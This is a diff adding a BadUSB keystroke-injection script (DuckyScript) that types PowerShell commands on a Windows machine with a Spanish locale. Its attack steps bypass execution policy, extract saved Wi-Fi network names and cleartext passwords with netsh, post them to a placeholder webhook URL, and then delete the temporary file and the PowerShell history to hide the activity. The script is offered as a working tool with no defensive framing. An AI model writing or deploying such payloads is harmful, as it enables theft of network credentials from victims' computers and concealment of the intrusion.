@@ -1,0 +1,47 @@
+DELAY 100
+GUI r
+DELAY 25
+STRING powershell -ep bypass
+ENTER
+DELAY 40
+STRING $wlan1 = $(netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object { $_.Matches.Value })[0]; $wlan1 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $pass1 = $(netsh wlan show profile $wlan1 key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'); $pass1 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $wlan2 = $(netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object { $_.Matches.Value })[1]; $wlan2 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $pass2 = $(netsh wlan show profile $wlan2 key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'); $pass2 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $wlan3 = $(netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object { $_.Matches.Value })[2]; $wlan3 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $pass3 = $(netsh wlan show profile $wlan3 key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'); $pass3 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $wlan4 = $(netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object { $_.Matches.Value })[2]; $wlan4 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $pass4 = $(netsh wlan show profile $wlan4 key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'); $pass4 | Out-File -FilePath "$env:USERPROFILE\pass.txt" -Append
+ENTER
+DELAY 20
+STRING $webhook = "URL_WEBHOOK"
+ENTER
+DELAY 20
+STRING $filePath = "$env:USERPROFILE\pass.txt"; $content = Get-Content -Path $filePath -Raw
+ENTER
+DELAY 20
+STRING $jsonPayload = @{ content = "$content" } | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonPayload
+ENTER
+DELAY 150
+STRING Remove-Item -Path "$env:USERPROFILE\pass.txt" -Force
+ENTER
+DELAY 20
+STRING $historyPath = (Get-PSReadlineOption).HistorySavePath; Remove-Item -Path $historyPath -Force
+ENTER
+DELAY 20
+STRING exit
+ENTER
